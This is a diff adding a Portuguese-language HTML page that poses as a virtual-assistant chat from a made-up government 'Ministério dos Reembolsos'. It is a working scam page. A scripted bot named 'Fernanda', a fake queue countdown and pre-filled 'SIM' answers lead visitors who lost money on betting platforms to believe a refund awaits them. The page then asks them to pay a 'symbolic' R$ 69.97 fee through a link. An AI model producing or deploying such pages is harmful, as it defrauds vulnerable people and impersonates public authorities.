@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Assistente Virtual - Ministério dos Reembolsos</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 420px;
+      margin: 40px auto;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+    .header {
+      background-color: #0066cc;
+      color: white;
+      padding: 20px;
+      text-align: center;
+      position: relative;
+    }
+    .atendente-info {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .atendente-info img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border: 2px solid white;
+    }
+    .fila {
+      font-size: 12px;
+      margin-top: 5px;
+      color: #d9edf7;
+    }
+    .chat {
+      padding: 20px;
+      height: 400px;
+      overflow-y: auto;
+    }
+    .msg {
+      margin-bottom: 15px;
+    }
+    .bot {
+      text-align: left;
+    }
+    .user {
+      text-align: right;
+    }
+    .msg span {
+      display: inline-block;
+      padding: 10px 15px;
+      border-radius: 15px;
+      max-width: 75%;
+    }
+    .bot span {
+      background-color: #eee;
+    }
+    .user span {
+      background-color: #0066cc;
+      color: white;
+    }
+    .digitando {
+      font-size: 12px;
+      color: gray;
+      margin-bottom: 10px;
+      font-style: italic;
+    }
+    .input-box {
+      display: flex;
+      padding: 10px;
+      border-top: 1px solid #ccc;
+      background-color: #fafafa;
+    }
+    input {
+      flex: 1;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      margin-left: 10px;
+      background-color: #0066cc;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="header" style="background-color: #0066cc; color: white; padding: 20px; text-align: center; position: relative;">
+
+    <img src="images/govnovoo.png" alt="Logo Governo" style="width: 150px; margin: 10px auto 12px; border-radius: 6px; box-shadow: 0 0 4px rgba(0,0,0,0.3); display: block;">
+  
+    <div class="atendente-info" style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 5px;">
+      <img src="images/fotofuncionario.png" alt="Fernanda" style="width: 40px; height: 40px; border-radius: 50%; border: 2px solid white;">
+      <span><strong>Fernanda</strong> • Agente Virtual</span>
+    </div>
+  
+    <div class="fila" id="fila" style="font-size: 12px; margin-top: 5px; color: #d9edf7;">
+      12 pessoas na fila aguardando atendimento...
+    </div>
+  </div>
+  
+  </div>    
+    <div class="chat" id="chatBox">
+      <div class="msg bot"><span>Olá, eu sou a assistente virtual do Ministério dos Reembolsos.</span></div>
+      <div class="msg bot"><span>Identifiquei que você pode ter direito a um reembolso parcial.</span></div>
+      <div class="msg bot"><span>Você confirma que perdeu dinheiro em plataformas de aposta?</span></div>
+    </div>
+    <div class="input-box">
+      <input type="text" id="inputMsg" placeholder="Digite sua resposta..." value="SIM" />
+      <button onclick="enviarMsg()">Enviar</button>
+    </div>
+  </div>
+
+  <script>
+    const chat = document.getElementById('chatBox');
+    const input = document.getElementById('inputMsg');
+    const fila = document.getElementById('fila');
+    let etapa = 1;
+    let finalizado = false;
+    let esperando = 12;
+
+    function enviarMsg() {
+      const texto = input.value.trim();
+      if (!texto) return;
+
+      addMsg('user', texto);
+      input.value = '';
+      simularDigitando(() => {
+        if (finalizado) {
+          addMsg('bot', `<a href='/saque/index.html' target='_blank'>Clique aqui para validar e liberar o reembolso</a>`);
+        } else if (etapa === 1) {
+          addMsg('bot', 'Obrigado pela confirmação.');
+          simularDigitando(() => {
+            addMsg('bot', 'Deseja receber o reembolso via Pix?');
+            input.value = 'SIM';
+            etapa = 2;
+          });
+        } else if (etapa === 2) {
+          addMsg('bot', 'Perfeito. Último passo:');
+          simularDigitando(() => {
+            addMsg('bot', 'Para validar sua identidade, é necessário um pagamento simbólico de R$ 69,97, que será estornado.');
+            addMsg('bot', `<a href='/teste01/saque/index.html' target='_blank'>Clique aqui para validar e liberar o reembolso</a>`);
+            etapa = 3;
+            finalizado = true;
+          });
+        }
+      });
+
+      atualizarFila();
+    }
+
+    function addMsg(tipo, texto) {
+      const div = document.createElement('div');
+      div.className = 'msg ' + tipo;
+      div.innerHTML = `<span>${texto}</span>`;
+      chat.appendChild(div);
+      chat.scrollTop = chat.scrollHeight;
+    }
+
+    function simularDigitando(callback) {
+      const typing = document.createElement('div');
+      typing.className = 'digitando';
+      typing.innerText = 'Fernanda está digitando...';
+      chat.appendChild(typing);
+      chat.scrollTop = chat.scrollHeight;
+
+      setTimeout(() => {
+        typing.remove();
+        callback();
+      }, 1000 + Math.random() * 1500);
+    }
+
+    function atualizarFila() {
+      esperando = Math.max(0, esperando - 1);
+      fila.innerText = esperando > 0 ? `${esperando} pessoas na fila aguardando atendimento...` : "Você é o próximo a ser atendido!";
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      input.value = "SIM";
+    });
+  </script>
+</body>
+</html>
